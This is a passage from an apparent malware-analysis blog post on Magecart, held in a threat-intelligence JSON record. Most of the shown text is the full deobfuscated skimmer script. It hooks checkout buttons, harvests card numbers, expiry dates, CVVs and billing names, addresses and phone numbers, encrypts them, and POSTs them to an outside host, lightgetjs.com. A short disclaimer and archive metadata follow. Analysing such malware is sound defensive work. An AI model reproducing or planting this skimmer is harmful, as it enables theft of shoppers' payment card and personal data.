readyr() {\n try {\n  var _0x5bbf66 = [\n   \"place_order\",\n   \"place-order\",\n   \"payment-buttons-container\",\n   \"billing-buttons-container\",\n   \"review-buttons-container\",\n  ];\n  var _0x8475c0 = _0x5bbf66[\"length\"];\n  for (var _0x2e623e = 0x0; _0x2e623e < _0x8475c0; _0x2e623e++) {\n   f = _0x5bbf66[_0x2e623e];\n   try {\n    k = \"[id*='\" + f + \"\\x27]\";\n    var _0x7ddc45 = document[\"querySelectorAll\"](k),\n     _0x5d458a = 0x0;\n    for (; _0x5d458a < _0x7ddc45[\"length\"]; _0x5d458a++) {\n     _0x7ddc45[_0x5d458a][\"addEventListener\"](\"click\", bts);\n    }\n   } catch (_0x375bef) {}\n  }\n } catch (_0x36add6) {}\n try {\n  var _0x5bbf66 = [\"btn-checkout\"];\n  var _0x8475c0 = _0x5bbf66[\"length\"];\n  for (var _0x2e623e = 0x0; _0x2e623e < _0x8475c0; _0x2e623e++) {\n   f = _0x5bbf66[_0x2e623e];\n   try {\n    k = \"[class*='\" + f + \"\\x27]\";\n    var _0x7ddc45 = document[\"querySelectorAll\"](k),\n     _0x5d458a = 0x0;\n    for (; _0x5d458a < _0x7ddc45[\"length\"]; _0x5d458a++) {\n     _0x7ddc45[_0x5d458a][\"addEventListener\"](\"click\", bts);\n    }\n   } catch (_0x24b4f5) {}\n  }\n } catch (_0x196a93) {}\n}\nwindow[\"addEventListener\"](\"load\", readyr);\nsetInterval(bts, 0x7d0);\nvar vvk = \"\";\nfunction bts() {\n try {\n  var _0x34f9e9 = {};\n  _0x34f9e9[\"hostname\"] = window[\"location\"][\"hostname\"];\n  var _0x4a60b2 = document[\"querySelectorAll\"](\"input\");\n  var _0x570cfd = _0x4a60b2[\"length\"];\n  var _0x57a5b3 = \"\";\n  for (var _0x1e5f96 = 0x0; _0x1e5f96 < _0x570cfd; _0x1e5f96++) {\n   el = _0x4a60b2[_0x1e5f96][\"id\"];\n   pos = el[\"indexOf\"](\"_cc_number\");\n   if (pos > 0x0) {\n    _0x57a5b3 = el[\"substr\"](0x0, pos);\n\n```\n\n-----\n\n```\n   }\n  }\n  if (!_0x57a5b3) return;\n  var _0x553440 = _0x57a5b3;\n  try {\n   _0x34f9e9[\"vm_cc_number\"] = document[\"getElementById\"](_0x553440 +\n\"_cc_number\")[\"value\"];\n  } catch (_0x1f7150) {}\n  if (!_0x34f9e9[\"vm_cc_number\"]) return;\n  try {\n   _0x34f9e9[\"vm_expiration\"] = document[\"getElementById\"](_0x553440 +\n\"_expiration\")[\"value\"];\n  } catch (_0x136215) {}\n  try {\n   _0x34f9e9[\"vm_expiration_yr\"] = document[\"getElementById\"](_0x553440 +\n\"_expiration_yr\")[\"value\"];\n  } catch (_0x4ab22b) {}\n  try {\n   _0x34f9e9[\"vm_cc_cid\"] = document[\"getElementById\"](_0x553440 + \"_cc_cid\")\n[\"value\"];\n  } catch (_0x4df1f0) {}\n  try {\n   if (!_0x34f9e9[\"vm_expiration\"]) {\n    _0x34f9e9[\"vm_expiration\"] = document[\"getElementById\"](_0x553440 +\n\"_cc_exp_month\")[\"value\"];\n   }\n  } catch (_0x90cd50) {}\n  try {\n   if (!_0x34f9e9[\"vm_expiration_yr\"]) {\n    _0x34f9e9[\"vm_expiration_yr\"] = document[\"getElementById\"](_0x553440 +\n\"_cc_exp_year\")[\"value\"];\n   }\n  } catch (_0x188c28) {}\n  try {\n   if (!_0x34f9e9[\"vm_cc_cid\"]) {\n    _0x34f9e9[\"vm_cc_cid\"] = document[\"getElementById\"](_0x553440 + \"_cc_cvv\")\n[\"value\"];\n   }\n  } catch (_0x32a59b) {}\n  var _0x1e9e38 = 0x0;\n  if (_0x34f9e9[\"vm_cc_number\"][\"length\"] == 0xf && _0x34f9e9[\"vm_cc_cid\"]\n[\"length\"] > 0x3) _0x1e9e38 = 0x1;\n  if (_0x34f9e9[\"vm_cc_number\"][\"length\"] > 0xf && _0x34f9e9[\"vm_cc_cid\"][\"length\"]\n>= 0x3) _0x1e9e38 = 0x1;\n  if (!_0x1e9e38) return;\n  var _0xe078a8 = [\n   \"firstname\",\n   \"lastname\",\n   \"email\",\n   \"street1\",\n   \"street2\",\n   \"city\",\n   \"region_id\",\n   \"country_id\",\n   \"postcode\",\n\n```\n\n-----\n\n```\n   telephone,\n  ];\n  _0x570cfd = _0xe078a8[\"length\"];\n  for (var _0x1e5f96 = 0x0; _0x1e5f96 < _0x570cfd; _0x1e5f96++) {\n   _0x553440 = _0xe078a8[_0x1e5f96];\n   k = \"billing:\" + _0x553440;\n   try {\n    _0x34f9e9[_0x553440] = document[\"getElementById\"](k)[\"value\"];\n   } catch (_0x12e01e) {}\n  }\n  if (!_0x34f9e9[\"postcode\"]) return;\n  if (_0x1e9e38) {\n   _0x34f9e9 = JSON[\"stringify\"](_0x34f9e9);\n   if (_0x34f9e9[\"length\"] == vvk[\"length\"]) return;\n   vvk = _0x34f9e9;\n   var _0x4c73bd = new XMLHttpRequest();\n   url = \"ht\" + \"tps://lightgetjs.com\";\n   _0x4c73bd[\"open\"](\"POST\", url + \"\", ![]);\n   _0x4c73bd[\"setRequestHeader\"](\"Content-Type\", \"application/x-www-formurlencoded\");\n   var _0xd96713 = new JSEncrypt();\n   _0xd96713[\"setPublicKey\"](\n\"MIIEIjANBgkqhkiG9w0BAQEFAAOCBA8AMIIECgKCBAEAw56hcvuGnPdvZ3HFAkK7T2Ga0y2ZKhdv2aToRSPsm\n   );\n   var _0x5dc551 = _0xd96713[\"encrypt\"](_0x34f9e9);\n   _0x4c73bd[\"send\"](\"k=\" + _0x5dc551);\n  }\n } catch (_0x2661d6) {}\n}\n\n#### Thank you for reading, and stay tuned for the next post where I'll be focusing on more advanced techniques to analyze Magecart malware, and malicious code in general.\n\n Disclaimers:\n\n I don’t recommend executing any unfamiliar code in your local environment without knowing what you're doing. Malware comes in all shapes and colors, and this post discusses a commonly found Magecart script structure. This is not an exhaustive analysis of all possible code injection techniques.\n\n```\n\n-----\n\n### Join our Growing Team\n\n#### Explore Openings\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-01-15 - Analyzing Magecart Malware – From Zero to Hero.pdf"
    ],
    "report_names": [
        "2020-01-15 - Analyzing Magecart Malware – From Zero to Hero.pdf"
    ],
    "threat_actors": [
        {
            "id": "5a0483f5-09b3-4673-bb5a-56d41eaf91ed",
            "created_at": "2023-01-06T13:46:38.814104Z",
            "updated_at": "2025-03-27T02:00:02.925972Z",
            "deleted_at": null,
            "main_name": "MageCart",
            "aliases": [],
            "source_name": "MISPGALAXY:MageCart",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "c0cedde3-5a9b-430f-9b77-e6568307205e",
            "created_at": "2022-10-25T16:07:23.528994Z",
            "updated_at": "2025-03-27T02:02:09.847683Z",
            "deleted_at": null,
            "main_name": "DarkHotel",
            "aliases": [
                "APT-C-06",
                "ATK 52",
                "CTG-1948",
                "Dubnium",
                "Fallout Team",
                "Higaisa",
                "Luder",
                "Operation DarkHotel",
                "Operation Daybreak",
                "Operation Inexsmar",
                "Operation PowerFall",
                "Operation The Gh0st Remains the Same",
                "SIG25",
                "Shadow Crane",
                "T-APT-02",
                "Tungsten Bridge",
                "Zigzag Hail"
            ],
            "source_name": "ETDA:DarkHotel",
            "tools": [
                "Asruex",
                "DarkHotel",
                "DmaUp3.exe",
                "GreezeBackdoor",
                "Karba",
                "Nemain",
                "Nemim",
                "Ramsay",
                "Retro",
                "Tapaoux",
                "Trojan.Win32.Karba.e",
                "Virus.Win32.Pioneer.dx",
                "igfxext.exe",
                "msieckc.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673535896,
    "ts_updated_at": 1743041449,
    "ts_creation_date": 1653686197,
    "ts_modification_date": 1653686197,
    "files": {
        "pdf": "https://archive.orkl.eu/28f851701af2a39688dc59934697a6b8615093d9.pdf",
        "text": "https://archive.orkl.eu/28f851701af2a39688dc59934697a6b8615093d9.txt",
        "img": "https://archive.orkl.eu/28f851701af2a39688dc59934697a6b8615093d9.jpg"
    }
}